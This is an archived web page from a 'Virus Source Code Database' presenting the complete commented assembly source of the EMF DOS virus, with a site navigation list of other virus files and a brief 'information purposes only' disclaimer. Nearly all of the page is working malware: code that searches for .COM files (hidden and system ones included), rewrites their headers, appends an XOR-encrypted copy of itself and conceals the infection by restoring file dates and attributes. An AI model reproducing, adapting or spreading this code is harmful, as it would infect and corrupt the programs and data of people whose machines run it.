<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: emf_asm</title>
<meta name="KEYWORDS" content="emf.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for emf.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="ear_6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ear_6_asm.php">ear_6_asm</a><br>
<a href="ear6_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ear6_asm.php">ear6_asm</a><br>
<a href="earthda__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/earthda__asm.php">earthda__asm</a><br>
<a href="earthday_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/earthday_asm.php">earthday_asm</a><br>
<a href="e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/e_asm.php">e_asm</a><br>
<a href="easytroj_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/easytroj_pas.php">easytroj_pas</a><br>
<a href="ebbelqux_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebbelqux_asm.php">ebbelqux_asm</a><br>
<a href="ebbelwoi_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebbelwoi_asm.php">ebbelwoi_asm</a><br>
<a href="ebugdis1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebugdis1_asm.php">ebugdis1_asm</a><br>
<a href="ebugdis__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ebugdis__asm.php">ebugdis__asm</a><br>
<a href="eddie2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie2_asm.php">eddie2_asm</a><br>
<a href="eddie_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie_3_asm.php">eddie_3_asm</a><br>
<a href="eddie3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie3_asm.php">eddie3_asm</a><br>
<a href="eddie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eddie_asm.php">eddie_asm</a><br>
<a href="edv_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/edv_asm.php">edv_asm</a><br>
<a href="ee3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ee3_asm.php">ee3_asm</a><br>
<a href="eemvoor1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor1_asm.php">eemvoor1_asm</a><br>
<a href="eemvoor2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor2_asm.php">eemvoor2_asm</a><br>
<a href="eemvoor3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoor3_asm.php">eemvoor3_asm</a><br>
<a href="eemvoord_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eemvoord_asm.php">eemvoord_asm</a><br>
<a href="emf__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emf__asm.php">emf__asm</a><br>
<a href="emf_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emf_asm.php">emf_asm</a><br>
<a href="emfii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emfii_asm.php">emfii_asm</a><br>
<a href="emma_10_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emma_10_asm.php">emma_10_asm</a><br>
<a href="emmie_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/emmie_asm.php">emmie_asm</a><br>
<a href="encode_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encode_asm.php">encode_asm</a><br>
<a href="en_com_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/en_com_asm.php">en_com_asm</a><br>
<a href="encrcom_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrcom_asm.php">encrcom_asm</a><br>
<a href="encrexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrexe_asm.php">encrexe_asm</a><br>
<a href="encroach_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encroach_asm.php">encroach_asm</a><br>
<a href="encrypt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/encrypt_asm.php">encrypt_asm</a><br>
<a href="enemy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enemy_asm.php">enemy_asm</a><br>
<a href="enew_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enew_asm.php">enew_asm</a><br>
<a href="en_exe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/en_exe_asm.php">en_exe_asm</a><br>
<a href="enigma__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enigma__asm.php">enigma__asm</a><br>
<a href="enigma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/enigma_asm.php">enigma_asm</a><br>
<a href="erasboot_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/erasboot_asm.php">erasboot_asm</a><br>
<a href="erasef_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/erasef_asm.php">erasef_asm</a><br>
<a href="eric-c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eric-c_asm.php">eric-c_asm</a><br>
<a href="es1411_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/es1411_asm.php">es1411_asm</a><br>
<a href="estonia_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/estonia_asm.php">estonia_asm</a><br>
<a href="etern562_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etern562_asm.php">etern562_asm</a><br>
<a href="etern599_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etern599_asm.php">etern599_asm</a><br>
<a href="eternit2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternit2_asm.php">eternit2_asm</a><br>
<a href="eternit__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternit__asm.php">eternit__asm</a><br>
<a href="eternity_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/eternity_asm.php">eternity_asm</a><br>
<a href="etr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/etr_asm.php">etr_asm</a><br>
<a href="evilman_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/evilman_asm.php">evilman_asm</a><br>
<a href="exebug2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/exebug2_asm.php">exebug2_asm</a><br>
<a href="exebug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/exebug_asm.php">exebug_asm</a><br>
<a href="extasy__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/extasy__asm.php">extasy__asm</a><br>
<a href="extasy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/extasy_asm.php">extasy_asm</a><br>
<a href="ezint1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint1_asm.php">ezint1_asm</a><br>
<a href="ezint2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint2_asm.php">ezint2_asm</a><br>
<a href="ezint4_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint4_asm.php">ezint4_asm</a><br>
<a href="ezint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/ezint_asm.php">ezint_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>


DATA SEGMENT
ORG 100H
DATA ENDS

; The EMF virus (c)1991 by Lazarus Long, Inc.
;  The author assumes no responsibility for any damage incurred
;  from the execution of this file, intentional or not
;


START:
         JMP VIRUS_START 
         
ENCRYPT_BYTE DB 00H             ;Storage space for byte that ID string is
                                ;Encrypted by

;------------------------------------------------------------------------------;
;The code from here to ENC_START is always unencrypted and SCAN would be able  ;
;to find it. Maybe a quick look at V2P7 would be in order (Hint,Hint!)         ;
;------------------------------------------------------------------------------;

VIRUS_START:
         CALL NEXT_STEP
NEXT_STEP:
         POP BP                            ;All actions relative to BP,

         IN AL,21H                         ;Lock out keyboard
         PUSH AX
         OR AL,2
         OUT 21H,AL


         MOV CX,ENC_LENGTH                 ;Number of bytes to decrypt                                         ;cause offsets

         LEA SI,[BP+OFFSET ENC_START-NEXT_STEP] ;Offset of data to decrypt                                          ;change in infected files
         MOV DL,[103H]                     ;Byte to decrypt with

         CALL CRYPT                        ;Decrypt main body of virus
         CALL RESTORE_EIGHT
         JMP SAVE_PSP                      ;Continue

INFECT:
         CALL CRYPT_WRITE
         MOV AH,40H
         MOV DX,BP                       ;Starting from BP-3
         SUB DX,3                        ;Which,convienently,is the start
         MOV CX,ENC_END-108H             ;of our viral code
         INT 21H                         ;Write all of virus
         CALL CRYPT_WRITE                ;Return and continue
         RET

CRYPT_WRITE:

         MOV CX,ENC_LENGTH                         ;Number of bytes to decrypt
         LEA SI,[BP+ OFFSET ENC_START - NEXT_STEP] ;Address to start decryption
         MOV DL,[0FBH]                             ;Byte to decrypt with
         CALL CRYPT
         RET

;******************************************************************************;
;Call this with SI equal to address to XOR,and CX number of bytes to XOR       :
;                                                                              ;
;******************************************************************************;
CRYPT:         
         XOR BYTE PTR [SI],DL ;XOR it
         INC SI               ;Increment XOR address
         INC DL               ;Change encryption key,eh?
         NOT DL               ;Reverse the key
         LOOP CRYPT           ;Until CX=0
         RET                  ;Then return                      

;******************************************************************************;
; Save PSP                                                                     ;
;******************************************************************************;

ENC_START EQU $
SAVE_PSP:
         MOV AH,30H                        ;Get DOS version
         INT 21H
         CMP AL,2                          ;Lower than 2?
         JNB ABOVE_2                       ;No,continue
         CALL RESTORE_EIGHT
         MOV SI,100H                       ;If so return
         PUSH SI
         RET 0FFFFH

ABOVE_2:
         PUSH ES                           ;Save ES
         MOV AX,3524H                      ;Get INT 24 address
         INT 21H
         MOV [BP+OLD_B-NEXT_STEP],BX       ;Save it
         MOV [BP+OLD_E-NEXT_STEP],ES
         MOV AH,25H                        ;Now set it to our own code
         LEA DX,[BP+NEW_24-NEXT_STEP]
         INT 21H
         POP ES                            ;Restore ES

         MOV CX,128                      ;Number of bytes to save
         MOV SI,80H                      ;From 80H.  ie the PSP
         LEA DI,[BP+ENC_END-NEXT_STEP]   ;To the end of our code
         PUSH DI                         ;Save location so we can restore the bytes
         REP MOVSB                       ;Mov'em

;------------------------------------------------------------------------------;                                                                              ;
; Find first .COM file that is either Hidden,read-only,system,or archive       ;
;------------------------------------------------------------------------------;


FIND_FIRST:

         LEA DX,[BP+WILD_CARD-NEXT_STEP]  ;Offset of *.COM,00
         MOV CX,27H                       ;Find ANY file that fits *.COM
         MOV AH,4EH                       ;Find first matching file
         INT 21H     
         JC QUIT                          ;If no *.COM files found,quit
         JMP SET_ATTRIBS

FIND_AGAIN:

         LEA DX,[BP+WILD_CARD-NEXT_STEP]   ;Offset of *.com
         MOV AH,4FH                   ;Find next matching file
         MOV CX,27H                   ;Archive,Hidden,Read-only,or System
         INT 21H
         JC QUIT                      ;No more files? Then exit

SET_ATTRIBS:
         MOV AX,[096H]          ;Get time
         AND AL,1EH             ;Are the seconds set to 60?
         CMP AL,1EH             ;
         JZ FIND_AGAIN          ;If so,assume this file is infected,find another
;------------------------------------------------------------------------------;
; Open file and infect it.                                                     ;
;                                                                              ;
;------------------------------------------------------------------------------;
         MOV DX,9EH                  ;offset into DTA of filename
         MOV AX,4301H                ;Set file attribs
         XOR CX,CX                   ;To normal file
         INT 21H
         JC QUIT                     ;Some sort of error occured,exit now!
         MOV AX,3D02H                ;Code for open file with read and write
                                     ;access
         INT 21H                     ;DX points to ASCIIZ string of filename
         MOV CX,04                   ;Read four bytes
         MOV BX,AX                   ;Save handle for future use
         MOV DX,0ACH                 ;Set buffer to end of DTA
         MOV AH,3FH                  ;Read from file
         INT 21H
         JMP MAKE_HEADER

QUIT:
         JMP DONE

;------------------------------------------------------------------------------;
; Infect .COM header so it jumps to our viral code                             ;
;------------------------------------------------------------------------------;
MAKE_HEADER:
         MOV [0F9H],[9AH]             ;Offset off file size in DTA
         MOV [0F8H]B,0E9H             ;Code for absolute JMP
         SUB WORD PTR [0F9H],2        ;Adjust it just a bit
         MOV AX,4200H                 ;Set file pointer to beginning
                                      ;of file to be infected
         XOR CX,CX                    ;Zero out CX
         XOR DX,DX                    ;Zero out DX
         INT 21H
         MOV AH,2CH                   ;Get time
         INT 21H
         ADD DL,[104H]                ;And add to what we had before
         MOV [0FBH],DL                ;Save that value for our key
         MOV AH,40H                   ;Write to file
         MOV DX,0F8H                  ;Starting at F8 hex
         MOV CX,04H                   ;Write eight bytes
         INT 21H
         
ERROR:   
         JC DONE                     ;Some sort of error?
                                     ;If so,exit
;------------------------------------------------------------------------------;
; Attach our viral code to the end of the target .COM file                     ;
;                                                                              ;
;------------------------------------------------------------------------------;
         MOV SI,0ACH                 ;Starting at A9h
         MOV CX,04                   ;Mov eight bytes
         LEA DI,[BP+ORIGINAL_EIGHT-NEXT_STEP];Where to save original eight bytes to
         REP MOVSB                   ;Save infected files original eight bytes
         MOV AX,4202H                ;Set file pointer to end of file
                                     ;plus 1
         XOR CX,CX                   ;Zero CX
         MOV DX,1                    ;Make DX=1
         INT 21H
         CALL INFECT                    ;Encrypt code, write it to file,
                                        ;Decrypt it,and return
;------------------------------------------------------------------------------;
; This restores the files original date and time                               ;
;------------------------------------------------------------------------------;

         MOV AX,5701H                   ;Restore original date and time
         MOV CX,[96H]                   ;From what was read in earlier
         MOV DX,[98H]                    
         AND CX,0FFE0H
         OR  CX,01EH                    ;Change seconds to 60
         INT 21H
         MOV AH,3EH                     ;Close that file
         INT 21H
         CALL RESTORE_ATTRIBS           ;Restore it's attributes

DONE:
RESTORE_PSP:
         PUSH DS                        ;Save the DS register
         MOV DX,[BP+OLD_B-NEXT_STEP]W   ;Move the old INT 24's address
         MOV DS,[BP+OLD_E-NEXT_STEP]W   ;so we can restore it
         MOV AX,2524H                   ;Restore it
         INT 21H
         POP DS                         ;Restore the DS register
         POP SI                         ;SI is equal to address we stored
                                        ;our PSP at
         MOV DI,80H                     ;Want to move saved PSP to 80h
         MOV CX,128                     ;Want to move 128 bytes
         REP MOVSB
         MOV SI,100H                    ;Odd sort of jump
         POP AX
         PUSH SI                        ;Ends up restoring control to
                                        ;100h
         OUT 21H,AL                     ;Unlock keyboard
         RET 0FFFFH                     ;Pop off all of stack
 
 RESTORE_EIGHT:        
         LEA SI,[BP+ORIGINAL_EIGHT-NEXT_STEP]  ;Restore original eight bytes so we
                                               ;can RET
         MOV DI,100H                           ;Destination of move
         MOV CX,04                             ;Move eight bytes
         REP MOVSB
         RET

RESTORE_ATTRIBS:
;------------------------------------------------------------------------------;
; This routine restores the files original attributes.                         ;
;------------------------------------------------------------------------------;        
         MOV AX,4301H                   ;Restore original attribs
         XOR CX,CX                      ;Zero out CX
         MOV CL,[95H]                   ;To what was read in earlier
         MOV DX,09EH                    ;Offset of filename
         INT 21H
         RET

NEW_24:
         XOR AX,AX                      ;Any error will simply be ignored
         STC                            ;Most useful for write protects
         IRET



OLD_E EQU $
OLD_ES DW 00 00
OLD_B EQU $
OLD_BX DW 00 00

ORIGINAL_EIGHT EQU $
OLD_EIGHT_BYTES  DB ,0CDH,20H,00,00      ;Bytes that are moved
                                                     ;and RET'd to
WILD_CARD EQU $
FILESPEC         DB '*.COM',00

;------------------------------------------------------------------------------
;This is just some generic text. Don't be a lamer and change the text and claim
;it was your own creation.
;------------------------------------------------------------------------------
TEXT DB 'Screaming Fist (c)10/91'
ENC_END EQU $

ENC_LENGTH = ENC_END - ENC_START              ;Length of code to be encrypted

</textarea></td></tr></table></body></html>
